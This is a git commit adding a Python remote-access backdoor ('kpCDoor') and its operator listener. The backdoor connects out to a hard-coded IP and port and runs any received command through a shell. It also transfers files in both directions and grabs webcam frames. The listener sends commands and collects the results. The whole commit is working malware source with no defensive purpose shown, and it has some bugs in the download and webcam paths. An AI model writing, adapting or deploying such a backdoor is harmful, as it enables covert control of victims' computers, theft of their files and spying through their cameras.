9ac9495cec2621768825c77a51bc65be1641bbc1
hkapc <hadikapc@outlook.com>
2023-06-18 09:08:38 -0400

    Commit mesajı

---
+++ kpCDoor/kpCDoor.py
@@ -0,0 +1,76 @@
+import socket
+import subprocess
+import json
+import base64
+import cv2
+import time
+import os
+
+class BackDoor:
+    def __init__(self, ip, port):
+        self.my_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.my_connection.connect((ip, port))
+
+    def json_send(self, data):
+        json_data = json.dumps(data)
+        self.my_connection.send(json_data.encode())
+
+    def json_receive(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + self.my_connection.recv(1024).decode()
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
+    def command_execution(self, command):
+        return subprocess.check_output(command, shell=True)
+
+    def exec_cd_command(self, directory):
+        os.chdir(directory)
+        return "Cd to " + directory
+
+    def exec_download_command(self, path):
+        with open(path, "rb") as dw_file:
+            return base64.b64decode(dw_file.read())
+
+    def save_file(self, path, content):
+        with open(path, "wb") as dw_file:
+            dw_file.write(base64.b64decode(content))
+            return "Download OK!"
+
+    def capture_webcam(self):
+        video_capture = cv2.VideoCapture(0)  # 0, varsayılan kamera için
+        frames = []
+        for _ in range(5):
+            ret, frame = video_capture.read()
+            frames.append(frame)
+            time.sleep(3)
+        video_capture.release()
+        return frames
+
+    def start_backdoor(self):
+        while True:
+            command = self.json_receive()
+            try:
+                if command[0] == "quit":
+                    self.my_connection.close()
+                    exit()
+                elif command[0] == "cd" and len(command) > 1:
+                    command_output = self.exec_cd_command(command[1])
+                elif command[0] == "download":
+                    command_output = self.exec_download_command(command[1])
+                elif command[0] == "upload":
+                    command_output = self.save_file(command[1], command[2])
+                elif command[0] == "webcam":
+                    command_output = self.capture_webcam()
+                else:
+                    command_output = self.command_execution(command)
+            except Exception:
+                command_output = "Error!"
+            self.json_send(command_output)
+
+
+my_backdoor_object = BackDoor("192.168.1.89", 8080)
+my_backdoor_object.start_backdoor()
---
+++ kpCDoor/kpCListener.py
@@ -0,0 +1,64 @@
+import socket
+import json
+import base64
+
+class SocketListener:
+    def __init__(self, ip, port):
+        self.my_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.my_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.my_listener.bind((ip, port))
+        self.my_listener.listen(0)
+        print("Listening...")
+        self.my_connection, my_address = self.my_listener.accept()
+        print("Connection OK from " + str(my_address))
+
+    def json_send(self, data):
+        json_data = json.dumps(data)
+        self.my_connection.send(json_data.encode())
+
+    def json_receive(self):
+        json_data = b""
+        while True:
+            try:
+                json_data += self.my_connection.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
+    def command_execution(self, command_input):
+        self.json_send(command_input)
+
+        if command_input[0] == "quit":
+            self.my_connection.close()
+            exit()
+
+        return self.json_receive()
+
+    def save_file(self, path, content):
+        with open(path, "wb") as dw_file:
+            dw_file.write(base64.b64decode(content))
+            return "Download OK!"
+
+    def get_content(self, path):
+        with open(path, "rb") as dw_file:
+            return base64.b64encode(dw_file.read()).decode()
+
+    def start_listener(self):
+        while True:
+            command_input = input("Enter command: ")
+            command_input = command_input.split(" ")
+            try:
+                if command_input[0] == "upload":
+                    file_content = self.get_content(command_input[1])
+                    command_input.append(file_content)
+                command_output = self.command_execution(command_input)
+
+                if command_input[0] == "download" and "Error!" not in command_output:
+                    command_output = self.save_file(command_input[1], command_output)
+            except Exception:
+                command_output = "Error!"
+            print(command_output)
+
+
+my_socket_listener = SocketListener("192.168.1.89", 8080)
+my_socket_listener.start_listener()
